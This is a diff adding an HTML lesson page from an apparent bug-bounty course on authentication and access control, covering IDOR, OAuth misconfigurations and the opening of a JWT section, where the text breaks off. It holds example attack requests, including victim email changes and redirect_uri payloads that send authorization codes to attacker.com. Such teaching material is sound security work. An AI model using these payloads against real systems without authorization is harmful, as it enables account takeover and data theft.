@@ -1,0 +1,1499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <!-- Progress & Achievements -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 07: Authentication &amp; Access Control - Bug Hunting</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { min-height: 100vh; background: #0a0508; font-family: 'Georgia', 'Times New Roman', serif; color: #8a6a9a; line-height: 1.7; overflow-x: hidden; }
+        body::before { content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(ellipse at 15% 40%, rgba(80, 40, 100, 0.08) 0%, transparent 50%), radial-gradient(ellipse at 85% 60%, rgba(60, 20, 80, 0.06) 0%, transparent 50%); pointer-events: none; z-index: 0; }
+        .scroll-progress { position: fixed; top: 0; left: 0; height: 3px; background: linear-gradient(90deg, #9333ea, #a855f7); z-index: 200; transition: width 0.1s linear; width: 0%; }
+        .module-header { background: rgba(10, 5, 15, 0.95); border-bottom: 1px solid rgba(100, 60, 130, 0.2); padding: 18px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px); }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .back-btn { background: rgba(80, 40, 100, 0.2); border: 1px solid rgba(100, 60, 130, 0.3); color: #9a7aaa; padding: 7px 14px; border-radius: 4px; font-size: 0.8rem; text-decoration: none; transition: all 0.3s ease; font-family: 'Georgia', serif; }
+        .back-btn:hover { background: rgba(100, 60, 130, 0.3); border-color: rgba(147, 51, 234, 0.5); color: #c4a0d8; }
+        .module-label { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; }
+        .header-right { display: flex; align-items: center; gap: 12px; font-size: 0.75rem; color: #6a4a7a; }
+        .progress-bar-mini { width: 120px; height: 4px; background: rgba(60, 30, 80, 0.3); border-radius: 2px; overflow: hidden; }
+        .progress-bar-mini .fill { height: 100%; background: linear-gradient(90deg, #9333ea, #a855f7); width: 0%; transition: width 0.5s ease; }
+        .module-content { max-width: 1100px; margin: 0 auto; padding: 40px; position: relative; z-index: 10; }
+        .intro-section { text-align: center; padding: 50px 0 60px; }
+        .intro-icon { font-size: 3.5rem; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.3)); }
+        .intro-title { font-size: 2.4rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; letter-spacing: 0.05em; }
+        .intro-meta { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.25em; text-transform: uppercase; margin-bottom: 20px; }
+        .intro-subtitle { font-size: 1rem; color: #8a6a9a; max-width: 720px; margin: 0 auto; line-height: 1.8; }
+        .module-stats { display: flex; justify-content: center; gap: 25px; margin-top: 30px; flex-wrap: wrap; }
+        .stat-pill { padding: 8px 18px; background: rgba(60, 30, 80, 0.15); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 20px; font-size: 0.75rem; color: #7a5a8a; letter-spacing: 0.1em; }
+        .section { margin-bottom: 80px; opacity: 0; transform: translateY(30px); transition: opacity 0.6s ease, transform 0.6s ease; }
+        .section.visible { opacity: 1; transform: translateY(0); }
+        .section-number { font-size: 0.65rem; color: #6a4a7a; letter-spacing: 0.35em; text-transform: uppercase; margin-bottom: 8px; }
+        .section-title { font-size: 1.9rem; color: #c4a0d8; margin-bottom: 20px; font-weight: 400; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid rgba(100, 60, 130, 0.15); padding-bottom: 15px; }
+        .section-icon { font-size: 1.6rem; opacity: 0.75; }
+        .section-body { color: #a080b0; font-size: 0.97rem; }
+        .section-body p { margin-bottom: 16px; }
+        .section-body ul { list-style: none; padding-left: 20px; margin-bottom: 16px; }
+        .section-body li { margin-bottom: 10px; position: relative; padding-left: 20px; }
+        .section-body li::before { content: '\25B8'; position: absolute; left: 0; color: #7a5a8a; }
+        .section-body h3 { color: #c4a0d8; font-size: 1.05rem; font-weight: 400; margin: 28px 0 14px; }
+        .standards-table { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 0.87rem; }
+        .standards-table th { background: rgba(40, 20, 60, 0.5); color: #c4a0d8; padding: 12px 16px; text-align: left; font-weight: normal; letter-spacing: 0.1em; font-size: 0.78rem; text-transform: uppercase; border-bottom: 1px solid rgba(100, 60, 130, 0.2); }
+        .standards-table td { padding: 12px 16px; color: #9a7aaa; border-bottom: 1px solid rgba(100, 60, 130, 0.08); vertical-align: top; }
+        .standards-table tr:hover td { background: rgba(40, 20, 60, 0.2); }
+        .standards-table .std-name { color: #c4a0d8; font-family: 'Courier New', monospace; font-size: 0.9rem; }
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; }
+        .badge-legacy { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-current { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+        .badge-latest { background: rgba(147, 51, 234, 0.2); color: #c084fc; border: 1px solid rgba(147, 51, 234, 0.3); }
+        .badge-info { background: rgba(59, 130, 246, 0.15); color: #93c5fd; border: 1px solid rgba(59, 130, 246, 0.3); }
+        .concept-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 18px; margin: 28px 0; }
+        .concept-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; transition: all 0.3s ease; }
+        .concept-card:hover { transform: translateY(-4px); border-color: rgba(147, 51, 234, 0.35); box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3); }
+        .concept-card-icon { font-size: 1.8rem; margin-bottom: 12px; }
+        .concept-card-title { font-size: 1rem; color: #c4a0d8; margin-bottom: 8px; }
+        .concept-card-body { font-size: 0.85rem; color: #8a6a9a; line-height: 1.6; }
+        .callout { border-radius: 8px; padding: 20px 24px; margin: 24px 0; display: flex; gap: 16px; align-items: flex-start; }
+        .callout-info { background: rgba(40, 20, 60, 0.4); border-left: 3px solid #9333ea; }
+        .callout-warning { background: rgba(60, 40, 10, 0.4); border-left: 3px solid #ca8a04; }
+        .callout-danger { background: rgba(60, 20, 20, 0.4); border-left: 3px solid #dc2626; }
+        .callout-tip { background: rgba(20, 50, 30, 0.4); border-left: 3px solid #16a34a; }
+        .callout-icon { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
+        .callout-title { font-size: 0.8rem; letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 6px; }
+        .callout-info .callout-title { color: #a855f7; }
+        .callout-warning .callout-title { color: #eab308; }
+        .callout-danger .callout-title { color: #ef4444; }
+        .callout-tip .callout-title { color: #22c55e; }
+        .callout-text { font-size: 0.9rem; color: #9a7aaa; line-height: 1.65; }
+        .code-block { background: rgba(5, 2, 10, 0.8); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 6px; padding: 16px 20px; margin: 16px 0; font-family: 'Courier New', monospace; font-size: 0.84rem; color: #b090c0; overflow-x: auto; line-height: 1.6; white-space: pre-wrap; }
+        .code-block .kw { color: #a855f7; }
+        .code-block .str { color: #86efac; }
+        .code-block .comment { color: #6a4a7a; font-style: italic; }
+        .code-block .flag { color: #fbbf24; }
+        .code-block .cmd { color: #c4a0d8; }
+        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }
+        .col-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; }
+        .col-card h3 { font-size: 1rem; color: #c4a0d8; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .col-card ul { list-style: none; padding: 0; }
+        .col-card li { font-size: 0.88rem; color: #8a6a9a; padding: 6px 0; border-bottom: 1px solid rgba(100, 60, 130, 0.08); display: flex; align-items: flex-start; gap: 8px; }
+        .col-card li:last-child { border-bottom: none; }
+        .li-marker { color: #9333ea; flex-shrink: 0; }
+        .numbered-list { list-style: none; padding: 0; margin: 20px 0; counter-reset: step-counter; }
+        .numbered-list li { counter-increment: step-counter; padding: 12px 18px 12px 50px; margin-bottom: 8px; background: rgba(15, 8, 20, 0.5); border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px; position: relative; font-size: 0.9rem; color: #9a7aaa; line-height: 1.6; }
+        .numbered-list li::before { content: counter(step-counter, decimal-leading-zero); position: absolute; left: 16px; top: 12px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #9333ea; font-weight: bold; }
+        .discussion-section { background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.25); border-radius: 10px; padding: 30px; margin: 40px 0; }
+        .discussion-title { font-size: 1.1rem; color: #c4a0d8; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .prompt-list { list-style: none; padding: 0; }
+        .prompt-item { padding: 14px 18px; background: rgba(15, 8, 20, 0.5); border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px; margin-bottom: 10px; font-size: 0.9rem; color: #9a7aaa; line-height: 1.6; display: flex; gap: 12px; }
+        .prompt-num { color: #9333ea; font-size: 0.8rem; font-family: 'Courier New', monospace; flex-shrink: 0; padding-top: 2px; }
+        .detail-section { border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; margin: 12px 0; overflow: hidden; }
+        .detail-header { padding: 16px 20px; background: rgba(15, 8, 20, 0.6); cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: background 0.3s ease; user-select: none; }
+        .detail-header:hover { background: rgba(40, 20, 60, 0.5); }
+        .detail-header-left { display: flex; align-items: center; gap: 12px; }
+        .detail-header-title { font-size: 0.95rem; color: #c4a0d8; }
+        .detail-toggle { color: #7a5a8a; font-size: 0.8rem; transition: transform 0.3s ease; }
+        .detail-toggle.open { transform: rotate(180deg); }
+        .detail-body { display: none; padding: 20px 24px; background: rgba(10, 5, 15, 0.4); border-top: 1px solid rgba(100, 60, 130, 0.1); color: #9a7aaa; font-size: 0.9rem; line-height: 1.7; }
+        .detail-body.open { display: block; }
+        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 16px; margin: 20px 0; }
+        .tool-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 20px; transition: all 0.3s ease; }
+        .tool-card:hover { border-color: rgba(147, 51, 234, 0.3); }
+        .tool-name { font-size: 0.95rem; color: #c4a0d8; margin-bottom: 4px; font-family: 'Courier New', monospace; }
+        .tool-role { font-size: 0.68rem; color: #9333ea; letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 10px; }
+        .tool-desc { font-size: 0.84rem; color: #8a6a9a; line-height: 1.6; }
+        .completion-section { text-align: center; padding: 60px 40px; background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.3); border-radius: 12px; margin: 60px 0 40px; }
+        .completion-icon { font-size: 3.5rem; margin-bottom: 20px; }
+        .completion-title { font-size: 1.8rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; }
+        .completion-text { color: #8a6a9a; font-size: 0.95rem; max-width: 560px; margin: 0 auto 30px; line-height: 1.8; }
+        .completion-btn { display: inline-flex; align-items: center; gap: 10px; padding: 14px 36px; background: linear-gradient(135deg, #7c3aed, #9333ea); border: none; border-radius: 8px; color: #f3e8ff; font-size: 1rem; cursor: pointer; font-family: 'Georgia', serif; letter-spacing: 0.05em; transition: all 0.3s ease; box-shadow: 0 4px 20px rgba(147, 51, 234, 0.3); }
+        .completion-btn:hover { background: linear-gradient(135deg, #6d28d9, #7c3aed); box-shadow: 0 6px 30px rgba(147, 51, 234, 0.45); transform: translateY(-2px); }
+        @media (max-width: 768px) { .module-header { padding: 15px 20px; } .module-content { padding: 20px; } .two-col { grid-template-columns: 1fr; } .concept-grid { grid-template-columns: 1fr; } .tool-grid { grid-template-columns: 1fr; } .intro-title { font-size: 1.8rem; } .section-title { font-size: 1.4rem; } }
+    </style>
+</head>
+<body>
+
+<div class="scroll-progress" id="scrollProgress"></div>
+
+<header class="module-header">
+    <div class="header-left">
+        <a href="../index.html" class="back-btn">&#8592; Back to Course</a>
+        <div>
+            <div class="module-label">BH // Bug Hunting &middot; Module 07</div>
+        </div>
+    </div>
+    <div class="header-right">
+        <span>Reading Progress</span>
+        <div class="progress-bar-mini">
+            <div class="fill" id="readingFill"></div>
+        </div>
+    </div>
+</header>
+
+<main class="module-content">
+
+    <!-- Hero -->
+    <div class="intro-section">
+        <div class="intro-icon">&#128274;</div>
+        <h1 class="intro-title">Authentication &amp; Access Control</h1>
+        <div class="intro-meta">Bug Hunting &bull; Module 07 &bull; Auth &amp; Access</div>
+        <p class="intro-subtitle">
+            Authentication and access control vulnerabilities consistently rank among the highest-paying
+            bug classes across every major platform. Broken authentication leads to account takeover.
+            Broken access control leads to data exposure at scale. This module covers IDOR exploitation,
+            OAuth flow abuse, JWT attacks, session management weaknesses, CORS misconfigurations,
+            privilege escalation chains, password reset flaws, and a systematic methodology for testing
+            every layer of the authentication and authorization stack. These are the vulnerability classes
+            that produce four- and five-figure payouts with regularity.
+        </p>
+        <div class="module-stats">
+            <div class="stat-pill">IDOR</div>
+            <div class="stat-pill">OAuth &amp; JWT</div>
+            <div class="stat-pill">Session Attacks</div>
+            <div class="stat-pill">Privilege Escalation</div>
+            <div class="stat-pill">~30 min read</div>
+        </div>
+    </div>
+
+    <!-- ==================== SECTION 01: IDOR Deep Dive ==================== -->
+    <div class="section" id="s1">
+        <div class="section-number">Section 01</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128269;</span>
+            IDOR Deep Dive
+        </h2>
+        <div class="section-body">
+            <p>
+                Insecure Direct Object Reference &mdash; IDOR &mdash; occurs when an application exposes
+                internal object identifiers (database IDs, filenames, keys) to the user and fails to
+                verify that the requesting user is authorized to access the referenced object. The
+                identifier itself is not the vulnerability. The missing authorization check is. IDOR
+                is classified under OWASP A01:2021 Broken Access Control and is one of the most
+                frequently reported and rewarded vulnerability classes on every major bug bounty platform.
+            </p>
+
+            <h3>Horizontal vs. Vertical Access</h3>
+            <p>
+                The distinction matters for both exploitation and reporting. Horizontal IDOR means
+                accessing another user's resources at the same privilege level &mdash; viewing another
+                customer's invoice, downloading another user's private file, reading another employee's
+                profile data. Vertical IDOR means accessing resources reserved for a higher privilege
+                level &mdash; a regular user accessing admin endpoints, a free-tier user accessing
+                premium features, a viewer accessing editor functionality.
+            </p>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>&#8596; Horizontal IDOR</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9654;</span> Same privilege level, different user's data</li>
+                        <li><span class="li-marker">&#9654;</span> /api/users/1234/invoices &rarr; /api/users/1235/invoices</li>
+                        <li><span class="li-marker">&#9654;</span> Impact: data exposure, privacy violation</li>
+                        <li><span class="li-marker">&#9654;</span> Typical severity: Medium to High</li>
+                        <li><span class="li-marker">&#9654;</span> Escalates to Critical if PII or financial data</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>&#8597; Vertical IDOR</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9654;</span> Accessing higher privilege resources</li>
+                        <li><span class="li-marker">&#9654;</span> /api/admin/users &rarr; accessible by regular user</li>
+                        <li><span class="li-marker">&#9654;</span> Impact: privilege escalation, admin takeover</li>
+                        <li><span class="li-marker">&#9654;</span> Typical severity: High to Critical</li>
+                        <li><span class="li-marker">&#9654;</span> Often chains with other flaws for full compromise</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Testing Methodology</h3>
+            <p>
+                Effective IDOR testing requires two authenticated sessions &mdash; account A and account B.
+                Every request that includes an identifier should be tested by replaying it from the
+                other account's session. The identifier can appear anywhere: URL path parameters, query
+                strings, POST body fields, JSON payloads, HTTP headers, and cookies.
+            </p>
+
+            <ul class="numbered-list">
+                <li>Create two test accounts with different roles if possible. Log both into separate browser profiles or use Burp's session handling rules to swap cookies automatically.</li>
+                <li>Map every endpoint that includes an identifier. Look for numeric IDs, UUIDs, slugs, encoded values, and hashed references. Use Burp Logger or the HTTP history to build a complete list.</li>
+                <li>For numeric IDs, increment and decrement the value. For UUIDs, swap Account A's UUID with Account B's. For encoded values, decode (Base64, URL-encoding, hex), modify, and re-encode.</li>
+                <li>Test parameter pollution: send the same parameter twice with different values (e.g., <code>?user_id=1234&amp;user_id=1235</code>). Some frameworks take the first value, others take the last, and some concatenate.</li>
+                <li>Check for blind IDOR: the response may not differ visibly, but the server-side action (delete, modify, export) may execute against the wrong object. Verify by checking the victim account.</li>
+                <li>Test across HTTP methods. An endpoint that enforces authorization on GET may not enforce it on PUT, PATCH, or DELETE.</li>
+            </ul>
+
+            <h3>IDOR in Different Contexts</h3>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-title">API Endpoints</span>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>REST APIs are the most common IDOR surface. The resource ID is typically in the URL path:
+                    <code>/api/v1/orders/8847</code>, <code>/api/v1/users/profile/uuid-here</code>.
+                    GraphQL APIs are equally vulnerable but the ID appears in the query body rather than
+                    the URL. Test every mutation and query that accepts an ID argument.</p>
+                    <div class="code-block"><span class="comment"># REST IDOR test &mdash; swap order ID</span>
+<span class="cmd">GET</span> /api/v1/orders/<span class="flag">8847</span> HTTP/1.1
+Host: target.com
+Cookie: session=account_A_session
+
+<span class="comment"># Replay with Account B's session but Account A's order ID</span>
+<span class="cmd">GET</span> /api/v1/orders/<span class="flag">8847</span> HTTP/1.1
+Host: target.com
+Cookie: session=account_B_session</div>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-title">File Download Endpoints</span>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>File download IDOR is consistently high-impact because it exposes documents, invoices,
+                    medical records, or contracts. The identifier may be a filename, a document ID, or a
+                    signed URL parameter. Test by replacing the file reference with one belonging to another
+                    user. Check for path traversal in addition to IDOR &mdash; sometimes the filename parameter
+                    accepts <code>../</code> sequences.</p>
+                    <div class="code-block"><span class="comment"># File download IDOR</span>
+<span class="cmd">GET</span> /api/documents/download?id=<span class="flag">doc_a1b2c3</span>
+<span class="comment"># Replace with another user's document ID</span>
+<span class="cmd">GET</span> /api/documents/download?id=<span class="flag">doc_x9y8z7</span>
+
+<span class="comment"># Path traversal variant</span>
+<span class="cmd">GET</span> /api/documents/download?file=<span class="flag">../../other_user/report.pdf</span></div>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-title">POST Body &amp; Header References</span>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>Not all IDORs live in the URL. Many applications pass object references in the POST
+                    body, especially in JSON APIs. The <code>user_id</code>, <code>account_id</code>, or
+                    <code>org_id</code> field in a JSON request body is a prime target. Some applications
+                    also read object references from custom HTTP headers such as <code>X-User-Id</code>
+                    or <code>X-Account-Id</code>, which may be trusted without validation when they
+                    originate from an API gateway or load balancer.</p>
+                    <div class="code-block"><span class="comment"># JSON body IDOR</span>
+<span class="cmd">POST</span> /api/settings/update HTTP/1.1
+Content-Type: application/json
+
+{
+  <span class="str">"user_id"</span>: <span class="flag">"victim-uuid-here"</span>,
+  <span class="str">"email"</span>: <span class="str">"attacker@evil.com"</span>
+}
+
+<span class="comment"># Header-based IDOR</span>
+<span class="cmd">GET</span> /api/dashboard HTTP/1.1
+<span class="flag">X-Account-Id: victim-account-id</span></div>
+                </div>
+            </div>
+
+            <h3>Real-World IDOR Patterns That Pay Well</h3>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Pattern</th>
+                        <th>Typical Payout</th>
+                        <th>Why It Pays</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">PII Exposure via IDOR</td>
+                        <td><span class="badge badge-latest">$1,000 &ndash; $5,000+</span></td>
+                        <td>Full name, email, phone, address exposed for any user by ID enumeration. Regulatory risk (GDPR, CCPA) drives severity.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Financial Data IDOR</td>
+                        <td><span class="badge badge-latest">$2,000 &ndash; $10,000+</span></td>
+                        <td>Accessing invoices, payment methods, or transaction history of other users. Direct financial impact.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Account Takeover via IDOR</td>
+                        <td><span class="badge badge-latest">$3,000 &ndash; $15,000+</span></td>
+                        <td>Changing email/password of another account through an IDOR in the settings endpoint. Full account compromise.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Admin API IDOR</td>
+                        <td><span class="badge badge-latest">$5,000 &ndash; $20,000+</span></td>
+                        <td>Regular user accessing admin-only management endpoints. Vertical escalation with org-wide impact.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Bulk Data Export IDOR</td>
+                        <td><span class="badge badge-latest">$2,000 &ndash; $8,000+</span></td>
+                        <td>Export/download endpoints that return CSV or JSON dumps of another organization's data.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#9432;</span>
+                <div>
+                    <div class="callout-title">Reporting Tip</div>
+                    <div class="callout-text">When reporting IDOR, always demonstrate the impact with two
+                    accounts. Show the exact request from Account B that accesses Account A's data. Include
+                    the response body proving data leakage. Describe the population of affected users (all
+                    users, all org admins, etc.) and the sensitivity of the exposed data. Impact drives payout.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== SECTION 02: OAuth 2.0 Flows & Flaws ==================== -->
+    <div class="section" id="s2">
+        <div class="section-number">Section 02</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128279;</span>
+            OAuth 2.0 Flows &amp; Flaws
+        </h2>
+        <div class="section-body">
+            <p>
+                OAuth 2.0 is the de facto authorization framework for third-party access delegation on
+                the web. It allows a user to grant a third-party application limited access to their
+                resources on a service provider without sharing their credentials. Nearly every "Login
+                with Google/GitHub/Facebook" button implements some variant of OAuth 2.0. The protocol
+                is complex, the specification leaves many security decisions to implementers, and the
+                result is a rich attack surface.
+            </p>
+
+            <h3>Authorization Code Flow</h3>
+            <p>
+                The Authorization Code flow is the most secure and most common OAuth grant type for
+                server-side applications. The sequence begins when the client application redirects the
+                user to the authorization server with a <code>client_id</code>, <code>redirect_uri</code>,
+                <code>response_type=code</code>, <code>scope</code>, and a <code>state</code> parameter.
+                The authorization server authenticates the user, obtains consent, and redirects back to
+                the client's <code>redirect_uri</code> with an authorization code. The client then
+                exchanges this code for an access token via a back-channel POST, authenticating with its
+                <code>client_secret</code>.
+            </p>
+            <div class="code-block"><span class="comment"># Step 1: Authorization request</span>
+<span class="cmd">GET</span> /oauth/authorize?
+  <span class="flag">client_id</span>=app_12345
+  &amp;<span class="flag">redirect_uri</span>=https://app.example.com/callback
+  &amp;<span class="flag">response_type</span>=code
+  &amp;<span class="flag">scope</span>=read:profile
+  &amp;<span class="flag">state</span>=random_csrf_token_here
+
+<span class="comment"># Step 2: Authorization server redirects with code</span>
+<span class="cmd">302</span> Location: https://app.example.com/callback?
+  <span class="str">code</span>=AUTH_CODE_HERE
+  &amp;<span class="str">state</span>=random_csrf_token_here
+
+<span class="comment"># Step 3: Client exchanges code for token (back-channel)</span>
+<span class="cmd">POST</span> /oauth/token
+  <span class="flag">grant_type</span>=authorization_code
+  &amp;<span class="flag">code</span>=AUTH_CODE_HERE
+  &amp;<span class="flag">client_id</span>=app_12345
+  &amp;<span class="flag">client_secret</span>=SECRET
+  &amp;<span class="flag">redirect_uri</span>=https://app.example.com/callback</div>
+
+            <h3>Implicit Flow (Deprecated)</h3>
+            <p>
+                The Implicit flow was designed for browser-based (SPA) applications that cannot securely
+                store a <code>client_secret</code>. Instead of returning an authorization code, the
+                authorization server returns the access token directly in the URL fragment
+                (<code>#access_token=...</code>). This flow is deprecated because the token is exposed
+                in the browser history, referrer headers, and is vulnerable to token interception.
+                Modern guidance recommends the Authorization Code flow with PKCE for all client types,
+                including SPAs.
+            </p>
+
+            <h3>PKCE (Proof Key for Code Exchange)</h3>
+            <p>
+                PKCE extends the Authorization Code flow to protect against authorization code
+                interception. The client generates a random <code>code_verifier</code>, derives a
+                <code>code_challenge</code> from it (typically via SHA-256), and includes the challenge
+                in the authorization request. When exchanging the code for a token, the client sends the
+                original <code>code_verifier</code>. The authorization server verifies that it matches
+                the challenge. An attacker who intercepts the authorization code cannot exchange it
+                without the original verifier.
+            </p>
+
+            <h3>Common OAuth Misconfigurations</h3>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#8634;</div>
+                    <div class="concept-card-title">Open Redirect in redirect_uri</div>
+                    <div class="concept-card-body">
+                        The authorization server fails to strictly validate the <code>redirect_uri</code>.
+                        An attacker modifies it to point to their own server, capturing the authorization
+                        code or token. Test with subdomain variations, path traversal, URL-encoded characters,
+                        and appending attacker-controlled domains after a valid prefix.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#127922;</div>
+                    <div class="concept-card-title">Missing or Predictable state</div>
+                    <div class="concept-card-body">
+                        The <code>state</code> parameter is an anti-CSRF token. If it is missing, empty,
+                        or predictable, an attacker can craft a malicious authorization URL and force the
+                        victim to link the attacker's account, leading to account takeover via OAuth
+                        CSRF.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128225;</div>
+                    <div class="concept-card-title">Token Leakage via Referrer</div>
+                    <div class="concept-card-body">
+                        If the callback page loads external resources (images, scripts, analytics), the
+                        access token or authorization code in the URL may leak through the
+                        <code>Referer</code> header. This is especially dangerous with the Implicit flow
+                        where the token sits in the URL fragment.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128200;</div>
+                    <div class="concept-card-title">Scope Escalation</div>
+                    <div class="concept-card-body">
+                        The client requests a limited scope, but the attacker modifies the scope parameter
+                        in the authorization URL to request broader permissions. If the authorization server
+                        does not re-prompt the user for the expanded scope, the attacker obtains elevated
+                        access silently.
+                    </div>
+                </div>
+            </div>
+
+            <h3>OAuth Token Theft Scenarios</h3>
+            <p>
+                Token theft combines OAuth misconfigurations with other vulnerability classes to extract
+                access tokens. The attacker exploits an open redirect in the <code>redirect_uri</code>
+                to send the authorization code to their server, then exchanges it for an access token.
+                Alternatively, if the target application stores tokens in localStorage and has an XSS
+                vulnerability, the attacker extracts tokens directly from the victim's browser. A third
+                scenario involves a chain: OAuth CSRF (missing state) allows the attacker to link their
+                own OAuth provider account to the victim's application account, then log in as the victim
+                via "Login with Provider."
+            </p>
+
+            <div class="code-block"><span class="comment"># redirect_uri manipulation &mdash; steal auth code</span>
+<span class="cmd">GET</span> /oauth/authorize?
+  client_id=app_12345
+  &amp;redirect_uri=<span class="flag">https://attacker.com/steal</span>
+  &amp;response_type=code
+  &amp;scope=read:profile
+
+<span class="comment"># Subdomain variation bypass</span>
+  &amp;redirect_uri=<span class="flag">https://app.example.com.attacker.com/callback</span>
+
+<span class="comment"># Path traversal bypass</span>
+  &amp;redirect_uri=<span class="flag">https://app.example.com/callback/../../../attacker.com</span>
+
+<span class="comment"># Double URL-encoding bypass</span>
+  &amp;redirect_uri=<span class="flag">https://app.example.com%252f%252fattacker.com</span></div>
+
+            <div class="callout callout-danger">
+                <span class="callout-icon">&#9888;</span>
+                <div>
+                    <div class="callout-title">Critical Pattern</div>
+                    <div class="callout-text">Open redirect in <code>redirect_uri</code> combined with
+                    a valid OAuth flow is a high-severity finding because it directly leads to token theft.
+                    Programs that implement OAuth typically pay $2,000&ndash;$10,000+ for this class of bug
+                    because it compromises any user who clicks the crafted link.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== SECTION 03: JWT Attacks ==================== -->
+    <div class="section" id="s3">
+        <div class="section-number">Section 03</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128273;</span>
+            JWT Attacks
+        </h2>
+        <div class="section-body">
+            <p>
+                JSON Web Tokens (JWTs) are the dominant session token format in modern APIs. A JWT
+                consists of three Base64URL-encoded parts separated by periods: a header, a payload,
+                and a signature. The header declares the algorithm used for signing. The payload contains
+                claims &mdash; key-value pairs that convey identity and authorization data (user ID, role,
+                expiration time). The signature ensures integrity: tampering with the header or payload
+                invalidates the signature, and the server rejects the token.
+            </p>
+
+            <div class="code-block"><span class="comment"># JWT structure: header.payload.signature</span>
+<span class="str">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9</span>.<span class="flag">eyJ1c2VyX2lkIjoiMTIzNCIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzA5MDAwMDAwfQ</span>.<span class="kw">signature_bytes_here</span>
+
+<span class="comment"># Decoded header:</span>
+{ <span class="str">"alg"</span>: <span class="str">"RS256"</span>, <span class="str">"typ"</span>: <span class="str">"JWT"</span> }
+
+<span class="comment"># Decoded payload:</span>
